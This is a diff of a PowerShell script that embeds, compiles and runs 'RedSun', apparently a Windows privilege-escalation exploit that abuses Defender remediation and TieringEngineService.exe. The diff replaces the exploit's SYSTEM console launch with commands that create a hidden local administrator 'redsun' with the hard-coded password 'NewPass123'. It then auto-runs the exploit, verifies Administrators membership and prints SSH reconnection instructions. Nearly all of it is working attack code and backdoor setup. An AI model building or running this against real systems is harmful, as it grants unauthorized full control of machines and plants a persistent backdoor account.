@@ -3,7 +3,7 @@
 # - RedSun.cpp is embedded verbatim below in a PowerShell here-string.
 # - Finds any installed MSVC (VS 2017+) via vswhere, or scans conventional install paths.
 # - Compiles with the flags/libs the source needs (/DUNICODE + CldApi, ntdll, synchronization,
-#   user32, advapi32, ole32).
+#   user32, advapi32, ole32, netapi32).
 #
 # Usage:
 #   powershell -ExecutionPolicy Bypass -File .\deploy_redsun.ps1
@@ -39,11 +39,13 @@ $CPP = @'
 #include <winternl.h>
 #include <ntstatus.h>
 #include <cfapi.h>
+#include <lm.h>
 
 #pragma comment(lib,"synchronization.lib")
 #pragma comment(lib,"sas.lib")
 #pragma comment(lib,"ntdll.lib")
 #pragma comment(lib,"CldApi.lib")
+#pragma comment(lib,"netapi32.lib")
 
 
 typedef struct _FILE_DISPOSITION_INFORMATION_EX {
@@ -542,44 +544,26 @@ void DoCloudStuff(wchar_t* syncroot, wchar_t* filename, DWORD filesz = 0x1000)
 }
 
 
-void LaunchConsoleInSessionId()
+static void RunElevatedCmd(const wchar_t* cmdline)
 {
-
-    HANDLE hpipe = CreateFile(L"\\??\\pipe\\REDSUN", GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hpipe == INVALID_HANDLE_VALUE)
-        return;
-    DWORD sessionid = 0;
-    if (!GetNamedPipeServerSessionId(hpipe, &sessionid))
-        return;
-    CloseHandle(hpipe);
-    HANDLE htoken = NULL;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken))
-        return;
-    HANDLE hnewtoken = NULL;
-    bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hnewtoken);
-    CloseHandle(htoken);
-    if (!res)
-        return;
-
-    res = SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
-    if (!res)
-    {
-        CloseHandle(hnewtoken);
-        return;
-    }
-
-    STARTUPINFO si = { 0 };
+    wchar_t buf[512] = { 0 };
+    wcscpy(buf, cmdline);
+    STARTUPINFOW si = { 0 };
+    si.cb = sizeof(si);
     PROCESS_INFORMATION pi = { 0 };
-    CreateProcessAsUser(hnewtoken, L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
-
-    CloseHandle(hnewtoken);
-
-    if (pi.hProcess)
+    if (CreateProcessW(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        WaitForSingleObject(pi.hProcess, 10000);
         CloseHandle(pi.hProcess);
-    if (pi.hThread)
         CloseHandle(pi.hThread);
-    return;
+    }
+}
 
+static void CreateAdminUser()
+{
+    // Running as SYSTEM: stand up "redsun" in Administrators.
+    RunElevatedCmd(L"cmd.exe /c net user redsun NewPass123 /add");
+    RunElevatedCmd(L"cmd.exe /c net localgroup administrators redsun /add");
 }
 
 bool IsRunningAsLocalSystem()
@@ -598,7 +582,7 @@ bool IsRunningAsLocalSystem()
         return false;
     bool ret = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid);
     if (ret) {
-        LaunchConsoleInSessionId();
+        CreateAdminUser();
         ExitProcess(0);
     }
     return ret;
@@ -618,10 +602,6 @@ void LaunchTierManagementEng()
 
 int main()
 {
-    HANDLE hpipe = CreateNamedPipe(L"\\??\\pipe\\REDSUN", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, NULL, 1, NULL, NULL, NULL,NULL);
-    if (hpipe == INVALID_HANDLE_VALUE)
-        return 1;
-
     wchar_t workdir[MAX_PATH] = { 0 };
     ExpandEnvironmentStrings(L"%TEMP%\\RS-", workdir, MAX_PATH);
     
@@ -800,8 +780,30 @@ int main()
     ExpandEnvironmentStrings(L"%WINDIR%\\System32\\TieringEngineService.exe", mx2, MAX_PATH);
     CopyFile(mx, mx2, FALSE);
     LaunchTierManagementEng();
-    Sleep(2000);
-    CloseHandle(hpipe);
+
+    // Poll for the SYSTEM side to finish creating the account.
+    bool created = false;
+    for (int i = 0; i < 40; i++) {
+        USER_INFO_0* ui = NULL;
+        if (NetUserGetInfo(NULL, L"redsun", 0, (LPBYTE*)&ui) == NERR_Success) {
+            NetApiBufferFree(ui);
+            created = true;
+            break;
+        }
+        Sleep(250);
+    }
+
+    printf("\n");
+    if (created) {
+        printf("[+] Defender-mediated EoP complete. New local admin created:\n");
+        printf("      username: redsun\n");
+        printf("      password: NewPass123\n");
+        printf("    sshd's administrators_authorized_keys already authorizes your key for admins.\n");
+        printf("    Log back in with:  ssh -i winvm_key redsun@<vm-ip>\n");
+    } else {
+        printf("[!] Account 'redsun' did not appear within 10s.\n");
+        printf("    SYSTEM-side may still be in progress; re-check with 'net user redsun'.\n");
+    }
 
     return 0;
 }
@@ -833,7 +835,6 @@ function Find-VcVarsBat {
             if (Test-Path $bat) { return $bat }
         }
     }
-    # Fallback: scan common roots
     $roots = @("${Env:ProgramFiles}\Microsoft Visual Studio", "${Env:ProgramFiles(x86)}\Microsoft Visual Studio") |
              Where-Object { Test-Path $_ }
     foreach ($r in $roots) {
@@ -857,7 +858,7 @@ $buildBat = Join-Path $OutDir '_build.bat'
 @echo off
 cd /d "$OutDir"
 call "$vcvars" >nul
-cl /nologo /EHsc /std:c++17 /DUNICODE /D_UNICODE /W0 RedSun.cpp /link CldApi.lib ntdll.lib synchronization.lib user32.lib advapi32.lib ole32.lib
+cl /nologo /EHsc /std:c++17 /DUNICODE /D_UNICODE /W0 RedSun.cpp /link CldApi.lib ntdll.lib synchronization.lib user32.lib advapi32.lib ole32.lib netapi32.lib
 "@ | Set-Content -Path $buildBat -Encoding ASCII
 
 Info 'Compiling...'
@@ -873,11 +874,46 @@ Info "Built: $($info.FullName)  ($($info.Length) bytes)"
 Info "SHA256: $hash"
 
 if (-not $KeepSource) {
-    Remove-Item $srcPath                    -ErrorAction SilentlyContinue
-    Remove-Item (Join-Path $OutDir 'RedSun.obj') -ErrorAction SilentlyContinue
-    Remove-Item $buildBat                   -ErrorAction SilentlyContinue
+    Remove-Item $srcPath                              -ErrorAction SilentlyContinue
+    Remove-Item (Join-Path $OutDir 'RedSun.obj')      -ErrorAction SilentlyContinue
+    Remove-Item $buildBat                             -ErrorAction SilentlyContinue
 }
 
 Write-Host ""
-Info 'Next: run from a non-admin (Medium-IL) account to demonstrate the EoP:'
-Write-Host "    $exePath"
+Info "Running $exePath (Defender remediation usually takes ~30s)..."
+$runOut = & cmd.exe /c "`"$exePath`"" 2>&1
+$runOut | ForEach-Object { Write-Host "    $_" }
+
+Write-Host ""
+$user = Get-LocalUser -Name redsun -ErrorAction SilentlyContinue
+$inAdmins = $false
+if ($user) {
+    $inAdmins = [bool] (Get-LocalGroupMember -Group Administrators -ErrorAction SilentlyContinue |
+                       Where-Object { $_.SID -eq $user.SID })
+}
+
+if ($user -and $inAdmins) {
+    Info 'EoP succeeded. New local administrator:'
+    Write-Host "      Name    : $($user.Name)"
+    Write-Host "      SID     : $($user.SID)"
+    Write-Host "      Enabled : $($user.Enabled)"
+    Write-Host "      Password: NewPass123"
+    Write-Host ""
+    Info 'Administrators group members now:'
+    Get-LocalGroupMember -Group Administrators | ForEach-Object { Write-Host "      $($_.Name)" }
+    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+           Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' } |
+           Select-Object -First 1).IPAddress
+    if ($ip) {
+        Write-Host ""
+        Info "Reconnect with:  ssh -i winvm_key redsun@$ip"
+    }
+} elseif ($user) {
+    Warn "User 'redsun' exists but is NOT in Administrators."
+    Write-Host "      Name : $($user.Name)"
+    Write-Host "      SID  : $($user.SID)"
+} else {
+    Warn "User 'redsun' was not created."
+    Warn 'Check Defender state:'
+    Write-Host '    Get-MpComputerStatus | Select RealTimeProtectionEnabled, IsTamperProtected, AntivirusSignatureVersion'
+}
